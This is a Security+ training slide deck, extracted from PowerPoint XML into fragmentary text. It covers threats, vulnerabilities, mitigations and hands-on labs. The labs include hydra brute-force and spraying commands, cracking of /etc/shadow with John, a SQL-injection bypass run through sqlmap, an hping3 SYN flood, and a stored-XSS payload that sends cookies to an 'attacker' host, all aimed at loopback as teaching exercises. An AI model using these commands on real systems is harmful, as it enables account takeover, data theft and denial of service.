            <a:ext cx="4480560" cy="29889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2.3 · PHISHING VARIANTS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Phishing Family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Phishing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Mass fraudulent email luring clicks/credentials.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Spear phishing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Tailored to a specific person using OSINT.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Whaling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Spear phishing aimed at executives.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Voice-call phishing — 'IT support', 'the bank'.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Smishing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SMS phishing — parcel and bank-alert lures.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Business Email Compromise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Impersonate an exec/vendor to redirect a payment.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2.3 · TECHNIQUES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Other Social-Engineering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Pretexting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Invent a scenario to justify the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Impersonation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Pose as a trusted role (IT, auditor, courier).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Watering hole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Compromise a site the target group visits.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impersonation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Fake a trusted brand's look and domain.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Typosquatting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Register look-alike domains (paypa1.com).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Mis/disinformation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Seed false narratives to manipulate or distract.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2.3 · HANDS-ON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Try It — Cybersecurity Simulator (Ed Tool)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Open the Cybersecurity Simulator: https://alfredang.github.io/cybersecuritysimulator/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Walk a phishing scenario end to end — spot the lures a filter would miss.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each attacker move to the control that stops it (SPF/DKIM/DMARC, awareness, MFA).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This primes Lab 6 (phishing email analysis) and Lab 36 (GoPhish awareness campaign).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Indicators of Malicious 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Password attacks · Wireless attacks · IOCs &amp;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2.4 · CREDENTIAL ATTACKS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Brute force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Try every combination — slow, defeated by length + lockout.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Dictionary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Try common words/leaked passwords (rockyou.txt).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Password spraying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common password across many accounts — evades lockout.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Credential stuffing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Replay username/password pairs leaked elsewhere.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Offline cracking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Crack stolen hashes at full speed (hashcat, John).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Rainbow tables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Precomputed hash lookups — defeated by per-user salt.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2.4 · WIRELESS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Wireless Attacks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Rogue access point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Unauthorised AP bridged into the network.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Evil twin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 that clones a trusted SSID to harvest traffic.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Deauthentication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Force clients off so they reconnect to the attacker.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WPA handshake capture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Grab the 4-way handshake, then crack offline (aircrack-ng).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Bluetooth (blue-*)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Bluejacking/bluesnarfing against nearby devices.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WPA3, strong passphrase, 802.1X, WIPS, MAC randomisation.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2.4 · IOCs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the Indicators (IOCs)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Account: repeated failed logins, impossible-travel logins, out-of-hours access, new admin accounts.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Host: unexpected processes, suspicious PowerShell, new persistence, high CPU (crypto-mining).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Network: beaconing to unknown IPs, large outbound transfers, DNS to newly-registered domains.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Blocked content, missing/altered logs and resource exhaustion are all red flags — correlate them in a SIEM (Domain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2.5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Types of Vulnerabilities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Application · OS · Web · Hardware · Cloud · Supply chain · Zero-day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2.5 · CODE FLAWS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Application &amp; Memory Vulnerabilities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Buffer overflow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past a buffer to corrupt memory / run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Memory injection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Inject code into a running process's memory.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Race condition (TOCTOU)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Exploit the gap between check and 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Malicious update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Trojaned patch via a compromised update channel.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SQL injection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Untrusted input alters a database query (Lab 9).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Cross-site scripting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Inject script that runs in the victim's browser (Lab 10).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2.5 · WHERE THEY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&amp; Ecosystem Vulnerabilities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OS-based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Unpatched kernels/services; end-of-life systems.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Hardware / firmware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Insecure boot, legacy firmware, side-channels.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Virtualization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VM escape; resource-reuse leaks between guests.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Cloud-specific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Misconfigured buckets, over-permissive IAM, exposed keys.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Supply chain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Compromised library, vendor or dependency.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Mobile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Sideloaded apps, jailbreak/root, insecure storage.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2.5 · THE COMMON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Misconfiguration &amp; Zero-Day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Misconfiguration is the most common real-world root cause: default creds, open permissions, verbose errors, disabled logging.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hardening baseline (Domain 3/4) systematically removes misconfigurations — you verify it with OpenSCAP in Lab 35.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Zero-day: exploited before a patch exists — no signature yet, so rely on behaviour-based detection and defence in depth.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Cryptographic weakness: weak ciphers, small keys, reused nonces, broken hashes (MD5/SHA-1) — you harden TLS in Lab 19.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2.5 · HANDS-ON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Try It — Ethical Hacking &amp; FauxBank (Ed Tools)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Ethical Hacking Toolkit: https://alfredang.github.io/ethnicalhacking/ — guided recon, scanning and exploitation walk-throughs.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FauxBank target: https://pentest-fauxbank.vercel.app/ — a deliberately vulnerable bank to practise SQLi and XSS legally.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Only attack systems you are authorised to test — FauxBank and the labs are your legal playground.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These tools set up Labs 9–10 (SQLi/XSS) and Labs 32–34 (recon, Nmap, Metasploit).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2.5b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Mitigation Techniques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Secure the enterprise · Reduce the attack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2.5 · MITIGATIONS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Mitigation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Segmentation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Split the network into zones to stop lateral movement (Lab 14).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Least privilege, ACLs, and permission reviews (Lab 22).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Patching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Timely updates close known CVEs before exploitation.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Hardening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Disable services, enforce baselines, remove defaults (Labs 13, 35).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Encryption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data at rest and in transit (Labs 18, 19).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Detect what prevention misses — SIEM/IDS/EDR (Labs 24–26).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2.5 · TIE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Threat to Control — the Through-Line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Every threat in Domain 2 is answered by a control you build later in the course.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Phishing → mail authentication + awareness (Labs 6, 36); passwords → hashing, MFA, lockout (Labs 7, 23).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SQLi/XSS → input validation + WAF (Labs 9, 10, 16); DoS → rate limiting + detection (Lab 11).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This mapping is exactly how the SY0-701 exam frames 'given a scenario, choose the mitigation'.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Threats, Vulnerabilities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6–8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Phishing Email Header Analysis (SPF / DKIM / DMARC)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Password Attacks: Spraying, Brute Force, Cracking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Malware Static Analysis (Safe Sample)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9–11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SQL Injection (SQLi)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Cross-Site Scripting (XSS)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DoS Simulation and Detection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Labs 12–13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Vulnerability Scanning with Nikto and Nuclei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Linux Hardening Baseline with Lynis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Phishing Email Header Analysis (SPF / DKIM / DMARC)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dissects a spoofed email header and queries SPF, DKIM, and DMARC DNS records to prove the message did not come from the claimed sender.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header-analysis workflow that exposes SPF/DKIM/DMARC spoofing.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dnsutils, dig, swaks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Phishing Email Header Analysis (SP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Phishing Email Header Analysis (SPF / DKIM / DMARC)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DNS lookup and mail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dnsutils swaks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Phishing Email Header Analysis (SP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Phishing Email Header Analysis (SPF / DKIM / DMARC)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Save a known-bad phishing header to mail.eml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mail.eml &lt;&lt;'EOF'
...
EOF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Phishing Email Header Analysis (SP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Phishing Email Header Analysis (SPF / DKIM / DMARC)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Read the SPF record for the claimed sender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dig +short TXT paypal.com | grep spf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Phishing Email Header Analysis (SP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Phishing Email Header Analysis (SPF / DKIM / DMARC)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Pull the DMARC policy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dig +short TXT _dmarc.paypal.com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Phishing Email Header Analysis (SP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Phishing Email Header Analysis (SPF / DKIM / DMARC)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Pull the DKIM selector public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dig +short TXT s1024._domainkey.paypal.com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Phishing Email Header Analysis (SP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Phishing Email Header Analysis (SPF / DKIM / DMARC)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 test message with swaks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swaks --to test@example.com --from spoof@paypal.com --server localhost --suppress-data --quit-after RCPT 2&gt;&amp;1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Phishing Email Header Analysis (SPF / DKIM / DMARC)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learner confirms spf=fail, dkim=none, dmarc=fail in the header and that the sending IP is absent from the real SPF record.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brute-forces a local SSH account with hydra, cracks the /etc/shadow hash with John the Ripper, and demonstrates password spraying.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hands-on attack chain covering brute force, offline cracking, and spraying with their log signatures.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hydra, john, openssh-server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Password Attacks: Spraying, Brute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 attack tools and SSH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hydra john openssh-server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Password Attacks: Spraying, Brute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target user with a weak password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'victim:password123' | chpasswd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Password Attacks: Spraying, Brute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Build a small wordlist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words.txt &lt;&lt;'EOF'
...
EOF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Password Attacks: Spraying, Brute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Brute force SSH with hydra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hydra -l victim -P words.txt -t 4 -f ssh://127.0.0.1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Password Attacks: Spraying, Brute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Detect the attack in the auth log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grep "Failed password" /var/log/auth.log 2&gt;/dev/null | tail || journalctl -u ssh --no-pager | grep "Failed password" |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Password Attacks: Spraying, Brute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Crack the /etc/shadow hash with John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john --wordlist=words.txt target.hash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Password Attacks: Spraying, Brute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Demonstrate password spraying across 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for u in alice bob carol dave eve; do hydra -l "$u" -p "Winter2025!" -t 1 -f ssh://127.0.0.1;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Password Attacks: Spraying, Brute Force, Cracking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learner verifies hydra reports 'password123' as valid and John's --show reveals the cracked hash.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analyzes the harmless EICAR test file with file, strings, hashing, and a custom YARA rule the way a SOC analyst triages real malware.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static-analysis workflow producing an IoC hash and a reusable YARA detection.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file, binutils, coreutils, yara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Malware Static Analysis (Safe Samp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YARA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yara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Malware Static Analysis (Safe Samp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the safe EICAR test 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'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; sample.bin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Malware Static Analysis (Safe Samp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file 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file sample.bin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Malware Static Analysis (Safe Samp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Compute the SHA-256 IoC hash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sha256sum sample.bin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Malware Static Analysis (Safe Samp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Pull printable strings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strings sample.bin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Malware Static Analysis (Safe Samp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Write a YARA rule and scan the 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yara eicar.yar sample.bin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Malware Static Analysis (Safe Samp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Look up the known hash on threat feeds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yara -r eicar.yar /tmp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Malware Static Analysis (Safe Sample)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learner confirms the YARA rule matches sample.bin and that the SHA-256 is recognized across VirusTotal engines.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builds a deliberately vulnerable PHP/SQLite login, bypasses auth with manual and automated SQLi, then fixes it with parameterised queries.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vulnerable login app plus its prepared-statement patch.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sqlite3, php-cli, php-sqlite3, sqlmap, curl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SQL Injection (SQLi)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 SQLite/PHP/sqlmap stack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sqlite3 php-cli php-sqlite3 sqlmap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SQL Injection (SQLi)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Build a vulnerable login page and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php -S 127.0.0.1:8080 -t . &amp;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SQL Injection (SQLi)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normal login behaviour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"http://127.0.0.1:8080/login.php?u=admin&amp;p=s3cret"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SQL Injection (SQLi)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Bypass auth with a manual injection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"http://127.0.0.1:8080/login.php?u=admin'--&amp;p=anything"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SQL Injection (SQLi)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Automate exploitation with sqlmap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sqlmap -u "http://127.0.0.1:8080/login.php?u=admin&amp;p=x" --batch --dump -T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SQL Injection (SQLi)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Patch with a parameterised query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login.php &lt;&lt;'EOF'
...
EOF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SQL Injection (SQLi)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the injection now fails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"http://127.0.0.1:8080/login.php?u=admin'--&amp;p=x"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Injection (SQLi)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learner verifies the injected payload logs in before the patch and returns nothing after switching to bind parameters.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triggers reflected and stored XSS in tiny PHP pages, then defends with htmlspecialchars output encoding and a Content-Security-Policy header.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Vulnerable search/guestbook pages plus their encoding and CSP mitigations.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php-cli, curl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Cross-Site Scripting (XSS)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PHP and set up the workspace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php-cli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Cross-Site Scripting (XSS)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vulnerable reflected-XSS page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php -S 127.0.0.1:8080 -t . &amp;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Cross-Site Scripting (XSS)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Trigger the reflected XSS payload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"http://127.0.0.1:8080/search.php?q=&lt;script&gt;alert(1)&lt;/script&gt;"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Cross-Site Scripting (XSS)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Store an XSS payload in a guestbook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"http://127.0.0.1:8080/guestbook.php?msg=&lt;script&gt;document.location='http://attacker/?c='+document.cookie&lt;/script&gt;"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Cross-Site Scripting (XSS)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Mitigate with output encoding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'htmlspecialchars($q, ENT_QUOTES, "UTF-8")'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Cross-Site Scripting (XSS)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a strict Content-Security-Policy header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php -S 127.0.0.1:8080 router.php &amp;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Cross-Site Scripting (XSS)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the CSP header is served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-sD - "http://127.0.0.1:8080/search.php?q=hi"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Cross-Site Scripting (XSS)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learner confirms the script reflects verbatim before the fix and appears as escaped &amp;lt;script&amp;gt; text with a CSP header after.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floods their own loopback with hping3, watches the connection table fill with half-open sockets, then mitigates using SYN cookies and iptables rate-limiting.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SYN-flood detection-and-mitigation exercise on a local nginx target.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hping3, nginx, iptables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DoS Simulation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attacker and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hping3 nginx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DoS Simulation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Baseline the open connections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ss -s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DoS Simulation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Launch a loopback-only SYN flood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timeout 10 hping3 -S -p 80 --flood --rand-source 127.0.0.1 &amp;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DoS Simulation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Log incoming SYNs with iptables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iptables -A INPUT -p tcp --syn --dport 80 -j LOG --log-prefix "SYN: " --log-level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DoS Simulation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Enable SYN cookies and rate-limit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sysctl -w net.ipv4.tcp_syncookies=1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DoS Simulation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Insert the rate-limit accept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iptables -I INPUT -p tcp --syn --dport 80 -m limit --limit 25/s --limit-burst 50 -j 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DoS Simulation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Re-run the flood and compare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timeout 10 hping3 -S -p 80 --flood --rand-source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DoS Simulation and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learner verifies the SYN-RECV count spikes during the flood and stays bounded after enabling SYN cookies plus rate-limiting.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Scanning with Nikto and Nuclei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scans a local Apache server with Nikto and Nuclei, ranks findings by CVSS, applies hardening headers, and re-scans to confirm the fixes.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prioritised, CVSS-ranked remediation queue with verified header fixes.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nikto, apache2, nuclei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Vulnerability Scanning with Nikto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Scanning with Nikto and Nuclei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 scanner and target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nikto apache2 wget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Vulnerability Scanning with Nikto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Scanning with Nikto and Nuclei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Nikto against the local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nikto -h http://127.0.0.1 -o nikto.txt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Vulnerability Scanning with Nikto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Scanning with Nikto and Nuclei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Download and set up nuclei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wget -q https://github.com/projectdiscovery/nuclei/releases/download/v3.10.0/nuclei_3.10.0_linux_amd64.zip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Vulnerability Scanning with Nikto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Scanning with Nikto and Nuclei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Scan with a severity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./nuclei -u http://127.0.0.1 -s low,medium,high,critical -o nuclei.txt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Vulnerability Scanning with Nikto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Scanning with Nikto and Nuclei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hardening headers to Apache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a2enmod headers &amp;&amp; a2enconf hardening &amp;&amp; systemctl reload apache2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Vulnerability Scanning with Nikto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Scanning with Nikto and Nuclei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Re-run Nikto to confirm the fixes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nikto -h http://127.0.0.1 | grep -E "X-Frame|HSTS|banner"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Scanning with Nikto and Nuclei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learner verifies the missing-header findings disappear from the Nikto output after applying the hardening config.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audits an Ubuntu host with Lynis, applies SSH, sysctl, permission, and auto-update hardening, then re-audits to measure the improved hardening index.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before/after hardening score with CIS-aligned baseline fixes applied.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lynis, unattended-upgrades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Linux Hardening Baseline with Lyni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Lynis and unattended-upgrades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lynis unattended-upgrades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Linux Hardening Baseline with Lyni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the initial audit and note the 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lynis audit system --quick 2&gt;/dev/null | tee lynis-before.txt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Linux Hardening Baseline with Lyni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Disable unused services and set permissions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systemctl disable --now avahi-daemon 2&gt;/dev/null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Linux Hardening Baseline with Lyni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Enable automatic security updates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dpkg-reconfigure -f noninteractive unattended-upgrades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Linux Hardening Baseline with Lyni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Harden SSH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sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config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Linux Hardening Baseline with Lyni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kernel sysctl hardening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sysctl --system &gt;/dev/null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Linux Hardening Baseline with Lyni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Re-audit and compare the hardening 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grep "Hardening index" lynis-before.txt lynis-after.txt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Linux Hardening Baseline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learner confirms the Lynis hardening index climbs 10-15 points between the before and after audits.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Threats, Vulnerabilities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Analyze phishing email headers and validate anti-spoofing DNS records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Perform controlled brute force, cracking, and spraying against systems you own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Profile a benign test binary using core static-analysis primitives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Exploit and then patch a vulnerable PHP login page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Exploit reflected and stored XSS, then mitigate with encoding and CSP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Generate a controlled SYN flood, detect it, and rate-limit it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Scan a weak web server, prioritise findings by CVSS, and verify remediation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Audit, apply CIS-aligned fixes, and re-score a Linux host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Cloud &amp; enterprise models · Segmentation · Firewalls · WAF · VPN · Containers · Data protection ·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EXAM WEIGHTING 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Security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Architecture models — on-premises, cloud, hybrid, virtualisation, containers, IoT/ICS — each shift the attack surface and the shared-responsibility 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Defence in depth layers controls; network segmentation and firewalls limit lateral movement and enforce least privilege between zones.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web application firewall (WAF) filters HTTP attacks; a VPN protects data in transit; full-disk encryption (LUKS) and hardened TLS protect data at rest and in motion.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Resilience is a security property: RAID redundancy plus a tested 3-2-1 backup and recovery plan defeats ransomware and hardware failure.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Compare Architecture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On-prem · Cloud · Hybrid · Virtualization · Containers · IoT/ICS · Zero Trust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3.1 ·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Deployment &amp; Compute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On-premises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Full control and cost; you own every layer and every patch.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 (IaaS/PaaS/SaaS)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Elastic and managed; a shared-responsibility line shifts up the stack.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Hybrid &amp; multi-cloud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Mix of both — flexibility at the cost of a wider, more complex surface.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Virtualization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Hypervisor isolates VMs; watch for VM escape and sprawl.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Containers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Lightweight, fast — share the host kernel, so isolation is thinner (Lab 38).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Serverless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server to patch; misconfig and over-broad IAM become the risk.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3.1 · WHO SECURES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Shared-Responsibility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provider secures the cloud (physical, hypervisor, managed services); YOU secure what's IN it.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IaaS: you own OS, apps, data, IAM. PaaS: you own apps, data, IAM. SaaS: you own data and access.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#1 cloud breach cause is customer misconfiguration — public buckets, open security groups, leaked keys.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Read the matrix for each service before you deploy — assumptions cause gaps.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3.1 · IoT / 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Specialised &amp; Constrained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Cheap, long-lived, rarely patched — segment and monitor tightly.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ICS / SCADA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Operational tech running critical processes; availability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Embedded / RTOS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Fixed-function; hard to update — compensating controls.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Mitigation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Isolate on their own VLAN, restrict egress, and wrap with monitoring.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3.2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Secure Enterprise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Segmentation · Firewalls · Proxies · WAF · IDS/IPS · VPN · Secure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3.2 ·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&amp; Zero Trust Zones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Segment by trust and function: user LAN, server VLAN, DMZ, management, guest, OT.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DMZ hosts internet-facing services so a compromise can't reach the internal core.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Micro-segmentation pushes the boundary down to individual workloads (Zero Trust).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plan address ranges with the IP Calculator ed-tool and build the split in Lab 14.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3.2 · FIREWALLS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Firewalls &amp; Filtering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Packet filter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Stateless allow/deny by IP/port — fast, blunt.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Stateful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Tracks connections — the enterprise baseline (ufw/nftables, Lab 15).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Next-gen (NGFW)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Adds app-awareness, IDS/IPS and TLS inspection.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Filters HTTP attacks (SQLi/XSS) at layer 7 — ModSecurity, Lab 16.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Proxy / SWG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Mediates and inspects outbound web traffic.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NAC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Admits devices only if they meet a posture policy (agent/agentless, dynamic VLAN).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3.2 · DETECT &amp;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IDS vs IPS, and Secure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Secure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IDS — detects and alerts (out of band)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IPS — detects and BLOCKS inline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Signature vs anomaly detection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Suricata gives you both (Lab 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VPN — encrypts data across untrusted networks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IPsec (site-to-site) vs SSL/WireGuard (remote, Lab 17)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Jump host / bastion for admin access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802.1X port-based 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3.2 ·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Design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Grant the minimum access needed, nothing more.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Defence in depth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Layer independent controls.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Fail secure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 failure, deny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Separation of duties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single person holds end-to-end control.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Secure defaults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Ship locked down; open only what's needed.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Keep it simple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Complexity is the enemy of security.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Protect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Data states &amp; classification · Encryption at rest/in transit · Obfuscation · DLP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3.3 · KNOW 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States &amp;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 rest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Stored on disk/DB — protect with full-disk encryption (LUKS, Lab 18).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 transit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Moving across a network — protect with TLS/VPN (Labs 17, 19).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 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Loaded in memory — hardest; secure enclaves, minimise exposure.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Classification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Public → internal → confidential → restricted drives the controls.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Sovereignty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Where data may legally live — regulatory geolocation limits.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owner, steward and custodian each have defined duties.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3.3 ·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Encryption &amp; DLP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Full-disk encryption protects a lost/stolen device; file/database encryption protects specific assets.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TLS 1.2+/1.3 with modern ciphers protects data in transit — you disable weak ciphers in Lab 19.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DLP inspects content and blocks exfiltration by policy (email, USB, cloud upload).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Combine with obfuscation from Domain 1 — tokenization and masking shrink the value of what leaks.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3.4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Resilience &amp; Recovery in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Redundancy · RAID · Backups · Capacity · Site strategies · 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3.4 · STAY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High Availability &amp; Redundancy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Redundancy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single point of failure — dual power, NIC teaming, clustering.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Disk redundancy — RAID 1 mirror, RAID 5 parity (Lab 39, mdadm).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Load balancing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Spread load and survive node loss.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Geographic diversity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Hot / warm / cold recovery sites.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Capacity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People, compute, storage and bandwidth headroom.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UPS / generator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Ride through and survive power loss.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3.4 · BACKUP &amp;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Backups and the 3-2-1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3 copies of data, on 2 different media, with 1 copy off-site (and ideally 1 offline/immutable).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RPO = how much data you can afford to lose; RTO = how fast you must be back.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Immutable/air-gapped backups are the answer to ransomware — it can't encrypt what it can't reach.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 untested backup is a hope, not a control — you restore and verify in Lab 20.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Security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14–17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Network Segmentation with Linux Namespaces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Stateful Firewall with UFW and nftables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Web Application Firewall with ModSecurity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Site-to-Site VPN with WireGuard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18–37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Data at Rest: LUKS Full-Disk Encryption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TLS Hardening and Cipher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Backup and Recovery with restic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Cloud Shared Responsibility &amp; IAM Least Privilege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Labs 38–39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Container Security with Docker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Storage Resilience with Software RAID (mdadm)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DMZ, internal, and management zones as network namespaces and enforce a zone-to-zone policy with iptables.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Three isolated L3 zones behind a host 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ip netns, iproute2, veth, iptables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Network Segmentation with Linux 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three zone namespaces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netns add dmz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Network Segmentation with Linux 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veth pairs, move one end into each zone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link add veth-dmz type veth peer name veth-dmz-r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Network Segmentation with Linux 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Assign IPs and enable IP forwarding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netns exec dmz ip addr add 10.0.10.2/24 dev veth-dmz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Network Segmentation with Linux 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full reachability with no policy yet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netns exec dmz ping -c1 10.0.20.2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Network Segmentation with Linux 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default-deny FORWARD policy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iptables -P FORWARD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Network Segmentation with Linux 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explicit zone allow/deny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iptables -A FORWARD -s 10.0.20.0/24 -d 10.0.10.0/24 -j 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Network Segmentation with Linux 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Re-test the enforced screened-subnet policy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netns exec dmz ping -c1 -W1 10.0.20.2 || true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Segmentation with Linux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DMZ-to-Internal pings fail while Internal-to-DMZ and Mgmt-to-DMZ succeed.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Compare the UFW and nftables front-ends over the same netfilter engine, build an allow-list ruleset, and read its packet counters.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default-deny host firewall with visible counters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ufw, nftables, nginx, netcat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Stateful Firewall with UFW and nft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firewall tools and a test web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ufw nftables nginx netcat-openbsd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Stateful Firewall with UFW and nft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Build a UFW allow-list for SSH and HTTP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ufw allow 80/tcp comment 'HTTP from anywhere'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Stateful Firewall with UFW and nft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Enable UFW and show numbered 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ufw --force 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Stateful Firewall with UFW and nft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Test an allowed port versus a denied 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nc -zv 127.0.0.1 23 2&gt;&amp;1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Stateful Firewall with UFW and nft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Inspect the underlying nftables ruleset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nft list ruleset | head -40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240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Stateful Firewall with UFW and nft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Write and load an nftables ruleset directly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systemctl enable --now nftables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241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Stateful Firewall with UFW and nft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Watch per-rule counters under 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nft list chain inet filter input | grep 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Stateful Firewall with UFW and nftables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Port 80 answers, port 23 is blocked, and rule counters increment under load.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243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Deploy Apache with ModSecurity and the OWASP Core Rule Set, then watch it block SQLi, XSS, traversal, and command-injection payloads.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Apache site protected by the OWASP CRS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apache2, libapache2-mod-security2, modsecurity-crs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244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Web Application Firewall with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Apache, ModSecurity, and the CRS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apache2 libapache2-mod-security2 modsecurity-crs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245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Web Application Firewall with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Turn the rule engine from DetectionOnly to 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sed -i 's/^SecRuleEngine DetectionOnly/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf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246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Web Application Firewall with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Load the OWASP CRS and restart Apache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'Include /usr/share/modsecurity-crs/owasp-crs.load' &gt; /etc/modsecurity/owasp-crs.conf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247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Web Application Firewall with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the module and rules are loaded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apachectl -M 2&gt;/dev/null | grep security2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248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Web Application Firewall with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Fire SQLi, XSS, traversal, and cmd payloads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-o /dev/null -w "%{http_code}\n" "http://127.0.0.1/?q=&lt;script&gt;alert(1)&lt;/script&gt;"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249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Web Application Firewall with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Read the audit log for matched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tail -50 /var/log/modsec_audit.log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250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Web Application Firewall with ModS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Tune a false positive and reload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systemctl reload apache2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251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Each attack payload returns HTTP 403 and is recorded in the audit log.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252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Site-to-Site VPN with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an encrypted WireGuard tunnel between two simulated sites running in separate Linux network namespaces.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two-endpoint WireGuard tunnel across namespaces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wireguard, wireguard-tools, ip netns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253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Site-to-Site VPN with WireGuard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Site-to-Site VPN with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WireGuard and load the kernel module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wireguard wireguard-tools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254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Site-to-Site VPN with WireGuard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Site-to-Site VPN with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 key pair for each site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wg genkey | tee siteA.key | wg pubkey &gt; siteA.pub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255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Site-to-Site VPN with WireGuard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Site-to-Site VPN with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Build siteA/siteB namespaces with wg links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link add wgA type wireguard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256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Site-to-Site VPN with WireGuard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Site-to-Site VPN with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keys, listen ports, and allowed-ips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netns exec siteA wg set wgA private-key siteA.key listen-port 51820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257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Site-to-Site VPN with WireGuard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Site-to-Site VPN with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peer endpoints over host loopback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netns exec siteA wg set wgA peer "$(cat siteB.pub)" endpoint 127.0.0.1:51821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258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Site-to-Site VPN with WireGuard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Site-to-Site VPN with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the tunnel with ping and wg show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 netns exec siteA ping -c3 10.99.0.2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259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Site-to-Site VPN with WireGuard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Ping succeeds and wg show reports a recent handshake with transferred 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260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LUKS2-encrypted volume on a loopback file, mount it, rotate its passphrase, and add a key-file slot.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encrypted volume with rotation and a keyfile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cryptsetup, losetup, mkfs.ext4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261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Data at Rest: LUKS Full-Disk Encry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cryptsetup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cryptsetup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262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Data at Rest: LUKS Full-Disk Encry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50MB image on a loop device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losetup -fP --show vault.img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263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Data at Rest: LUKS Full-Disk Encry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Format the loop device with LUKS2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-n "Lab1234!" | cryptsetup luksFormat --type luks2 --cipher aes-xts-plain64 --key-size 512 --pbkdf argon2id "$LOOP"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264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Data at Rest: LUKS Full-Disk Encry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Open it, make a filesystem, and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-n "Lab1234!" | cryptsetup luksOpen "$LOOP" vault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265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Data at Rest: LUKS Full-Disk Encry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plaintext is absent from the raw image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strings vault.img | grep -i "secret data"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266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Data at Rest: LUKS Full-Disk Encry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Rotate the passphrase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-e "Lab1234!\nNewPass!9" | cryptsetup luksChangeKey "$LOOP"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267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Data at Rest: LUKS Full-Disk Encry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a key-file slot for unattended unlock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cryptsetup luksAddKey "$LOOP" /root/luks.key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268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at Rest: LUKS Full-Disk Encryption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secret string is unrecoverable from the raw image and both credentials unlock the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269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TLS Hardening and Cipher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Audit a fresh nginx HTTPS site with testssl.sh, apply a hardened TLS configuration, and re-audit to confirm improvement.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hardened TLS 1.2/1.3 nginx site with HSTS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nginx, openssl, testssl.sh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270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· TLS Hardening and Cipher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TLS Hardening and Cipher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up a self-signed HTTPS nginx site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req -x509 -newkey rsa:2048 -nodes -days 30 -keyout /etc/ssl/private/lab.key -out /etc/ssl/certs/lab.crt -subj "/CN=lab.local"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271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· TLS Hardening and Cipher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TLS Hardening and Cipher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Clone testssl.sh and run a baseline audit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./testssl.sh -p -P -s --color 0 https://localhost | tee ../baseline.txt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272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· TLS Hardening and Cipher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TLS Hardening and Cipher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Write a hardened TLS snippet and include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sed -i '/listen 443/a include /etc/nginx/snippets/tls-hardening.conf;' /etc/nginx/sites-available/default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273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· TLS Hardening and Cipher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TLS Hardening and Cipher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Reload nginx and re-audit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nginx -t &amp;&amp; systemctl reload nginx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274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· TLS Hardening and Cipher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TLS Hardening and Cipher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Cross-check downgrade resistance with openssl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openssl s_client -connect localhost:443 -tls1_1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275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TLS Hardening and Cipher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TLS 1.1 is rejected while TLS 1.3 negotiates a strong AEAD cipher and HSTS is present.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276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Configure encrypted, deduplicated restic backups, simulate ransomware, and perform a point-in-time restore.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encrypted restic repo with tested recovery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restic, python3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277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· Backup and Recovery with restic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restic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restic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278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· Backup and Recovery with restic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data and init an encrypted repo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restic -r /backup init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· Backup and Recovery with restic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Take the first snapshot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restic -r /backup backup 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280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· Backup and Recovery with restic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Modify data and take a second snapshot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restic -r /backup backup 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281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· Backup and Recovery with restic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Simulate ransomware overwriting all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for f in /data/*.txt; do echo "ENCRYPTED_BY_RANSOMWARE" &gt; "$f";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282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· Backup and Recovery with restic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Restore from the pre-ransomware snapshot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restic -r /backup restore $SNAP --target /restore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283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· Backup and Recovery with restic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restored files match the originals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diff -r /restore/data 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284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Backup and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pre-ransomware snapshot restores the original file contents intact.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285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Shared Responsibility &amp; IAM Least Privilege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models the cloud shared-responsibility split, then enforces least privilege on a mock cloud IAM policy and detects an over-permissive grant.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responsibility matrix (IaaS/PaaS/SaaS) and a tightened least-privilege JSON policy with the wildcard removed.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jq, policy JSON, bash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286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37 · Cloud Shared Responsibility &amp; IAM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Shared Responsibility &amp; IAM Least Privilege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an over-permissive policy granting *:*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'{"Effect":"Allow","Action":"*","Resource":"*"}' &gt; policy.json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287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37 · Cloud Shared Responsibility &amp; IAM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Shared Responsibility &amp; IAM Least Privilege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Flag the wildcard as a finding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jq 'select(.Action=="*")' policy.json &amp;&amp; echo "OVER-PERMISSIVE"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288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37 · Cloud Shared Responsibility &amp; IAM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Shared Responsibility &amp; IAM Least Privilege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Rewrite it to least privilege (read one bucket)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'{"Effect":"Allow","Action":["s3:GetObject"],"Resource":"arn:aws:s3:::reports/*"}' &gt; policy.json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289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37 · Cloud Shared Responsibility &amp; IAM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Shared Responsibility &amp; IAM Least Privilege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the wildcard is gone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jq -e '.Action|index("*")|not' policy.json &amp;&amp; echo LEAST-PRIV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290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37 · Cloud Shared Responsibility &amp; IAM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Shared Responsibility &amp; IAM Least Privilege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Map who secures what for IaaS/PaaS/SaaS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printf "IaaS: you=OS,app,data\nPaaS: you=app,data\nSaaS: you=data,IAM\n"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291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Shared Responsibility &amp; IAM Least Privilege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wildcard policy is flagged, and the rewritten policy scopes a single action to a single resource.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292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Security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runs a container, inspects its isolation, drops capabilities, runs as non-root and scans the image for vulnerabilities.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non-root, capability-dropped container and a Trivy image-scan report.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docker, trivy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293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38 · Container Security with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Security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Docker and run a container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docker.io &amp;&amp; docker run -d --name web nginx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294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38 · Container Security with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Security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Inspect the default (root) user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docker exec web whoami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38 · Container Security with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Security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Re-run dropping all capabilities and as non-root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docker run -d --name safe --user 1000 --cap-drop ALL --read-only nginx 2&gt;&amp;1 | tail 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296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38 · Container Security with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Security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the container cannot write the filesystem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docker exec safe touch /tmp/x 2&gt;&amp;1 || echo "READ-ONLY enforced"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297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38 · Container Security with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Security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Scan the image for known CVEs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trivy image --severity HIGH,CRITICAL nginx | head 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298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38 · Container Security with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Security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Limit resources to blunt a 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docker run -d --name capped --memory 128m --cpus 0.5 nginx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299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Container Security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hardened container runs as UID 1000 with no capabilities on a read-only root, and Trivy lists the image CVEs.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300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Storage Resilience with Software RAID (mdadm)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builds a RAID 1 mirror from loop devices, writes data, fails a disk, and confirms the data survives — the resilience leg of the CIA triad.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RAID 1 array that keeps serving data after one member is failed and removed.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mdadm, losetup, mkfs.ext4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301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39 · Storage Resilience with Software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Storage Resilience with Software RAID (mdadm)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mdadm and create two virtual disks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mdadm &amp;&amp; for d in 1 2; do dd if=/dev/zero of=/disk$d.img bs=1M count=200;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302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39 · Storage Resilience with Software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Storage Resilience with Software RAID (mdadm)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Attach them as loop devices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lo1=$(losetup -f --show /disk1.img); lo2=$(losetup -f --show /disk2.img)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303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39 · Storage Resilience with Software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Storage Resilience with Software RAID (mdadm)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RAID 1 mirror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mdadm --create /dev/md0 --level=1 --raid-devices=2 $lo1 $lo2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304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39 · Storage Resilience with Software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Storage Resilience with Software RAID (mdadm)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Format and write a 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mkfs.ext4 /dev/md0 &amp;&amp; mkdir -p /mnt/r &amp;&amp; mount /dev/md0 /mnt/r &amp;&amp; echo IMPORTANT &gt; /mnt/r/data.txt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305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39 · Storage Resilience with Software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Storage Resilience with Software RAID 